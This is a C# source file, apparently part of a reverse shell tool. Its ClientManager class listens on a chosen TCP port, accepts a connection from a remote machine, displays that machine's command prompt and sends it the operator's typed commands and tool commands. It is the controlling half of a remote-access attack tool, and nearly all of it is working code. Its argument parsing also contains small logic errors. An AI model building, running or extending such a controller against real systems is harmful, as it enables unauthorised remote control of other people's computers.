using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using Commands;
using Shared;

namespace ReverseShellClient
{
    public class ClientManager
    {
        Socket socketForServer;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        BinaryWriter binaryWriter;
        BinaryReader binaryReader;
        StringBuilder strInput;
        TcpListener tcpListener;

        ClientTools tools;
        bool connected;
        bool processingCommand;
        string toolsFilePath;


        public ClientManager()
        {
            connected = false;
            processingCommand = false;
            toolsFilePath = "";
            Console.ForegroundColor = ConsoleColor.Green;
        }


        public void Start()
        {
            var listen = true;

            while (listen)
            {
                Console.Write(@"Please type a port number to listen to : ");
                var port = 0;
                while (port == 0)
                {
                    try
                    {
                        port = int.Parse(Console.ReadLine());
                    }
                    catch (Exception)
                    {
                        Console.WriteLine(@"... please ...");
                    }
                }

                StartListen(port);

                listen = AskListenAgain();
            }
        }


        void StartListen(int port)
        {
            tcpListener = new TcpListener(IPAddress.Any, port);
            tcpListener.Start();

            Console.Clear();
            ColorTools.WriteCommandMessage("Listening on port " + port + " ...");
            // Wait for an incoming connection
            socketForServer = tcpListener.AcceptSocket();
            connected = true;

            var runClient = new Task(RunClient);
            runClient.Start();

            ProcessInput();
        }


        void RunClient()
        {
            networkStream = new NetworkStream(socketForServer);
            streamReader = new StreamReader(networkStream);
            streamWriter = new StreamWriter(networkStream);
            binaryWriter = new BinaryWriter(networkStream);
            binaryReader = new BinaryReader(networkStream);
            strInput = new StringBuilder();

            tools = new ClientTools(binaryWriter, binaryReader, streamWriter, streamReader);

            ColorTools.WriteCommandMessage("Connected to " + (IPEndPoint)socketForServer.RemoteEndPoint + "\n");

            tools.SayHello();


            // Listening loop
            while (true)
            {
                try
                {
                    strInput.Append(streamReader.ReadLine());

                    var command = CommandsManager.GetCommandByFlag(strInput.ToString());
                    if (command != null)
                    {
                        // Call client method
                        command.ClientMethod(null);
                        processingCommand = false;
                    }
                    else
                    {
                        // Normal output (text)
                        // Check if the line isn't the one representing the path in the cmd
                        if (!(strInput[strInput.Length - 1] == '>' && strInput.ToString().Contains(@":\")))
                        {
                            // Add line return
                            strInput.Append("\r\n");
                        }

                        // Display received data
                        Console.Write(strInput.ToString());
                    }
                    
                    strInput.Remove(0, strInput.Length);
                }
                catch (Exception)
                {
                    Cleanup();
                    break;
                }
            }
        }


        void ProcessInput()
        {
            while (true)
            {
                // If not allowed to send commands, continue
                if (processingCommand)
                {
                    continue;
                }

                var command = Console.ReadLine();

                // If the connection was closed, break from the loop
                if (!connected)
                {
                    break;
                }


                if (command == "clear" || command == "cls")
                {
                    // Clear console
                    Console.Clear();
                    tools.SayHello();
                }
                else if (command == "")
                {
                    tools.SayHello();
                }
                else
                {
                    var splittedCommand = command.Split(' ').ToList();
                    var commandName = splittedCommand[0];
                    var arguments = new List<string>();

                    if (splittedCommand.Count == 1)
                    {
                        arguments = splittedCommand.GetRange(1, splittedCommand.Count - 1);
                    }

                    var commandClass = CommandsManager.GetCommandByName(commandName);
                    if (commandClass != null)
                    {
                        if (command.Contains("help")){
                            // Help commands section
                            if (arguments.Count == 1 && arguments[1] == "help")
                            {
                                CommandsManager.ShowCommandHelp(commandClass);
                            }
                            else
                            {
                                CommandsManager.ShowGlobalHelp();
                            }

                            tools.SayHello();
                            continue;
                        }


                        if (!CommandsManager.CheckCommandSyntax(commandClass, arguments))
                        {
                            ColorTools.WriteCommandError($"Syntax error, check out the command's help page ({commandName} help)");
                            continue;
                        }


                        var preProcessResult = true;
                        try
                        {
                            preProcessResult = commandClass.PreProcessCommand(arguments);
                        }
                        catch (NotImplementedException)
                        {
                            // Ignored
                        }

                        if (!preProcessResult)
                        {
                            // Error in the PreProcess method
                            tools.SayHello();
                            continue;
                        }


                        if (commandClass.isLocal)
                        {
                            commandClass.ClientMethod(arguments);
                            tools.SayHello();
                            continue;
                        }
                        

                        // Will have to wait for the process to finish in order to issue commands again
                        processingCommand = true;
                    }

                    // Send the data to the server
                    streamWriter.WriteLine(command);
                    streamWriter.Flush();
                }
            }
        }


        bool AskListenAgain()
        {
            Console.Write("Listen again ? (y/N) ");
            var input = Console.ReadLine();
            Console.Clear();

            return input == "y" || input == "Y";
        }


        void Cleanup()
        {
            ColorTools.WriteWarning(processingCommand ? "\nDisconnected, operation stopped [ENTER]" : "\nDisconnected [ENTER]");

            connected = false;

            try
            {
                streamReader.Close();
                streamWriter.Close();
                binaryReader.Close();
                binaryWriter.Close();
                networkStream.Close();
                socketForServer.Close();
                tcpListener.Stop();
            }
            catch (Exception)
            {
                // ignored
            }
        }
    }
}
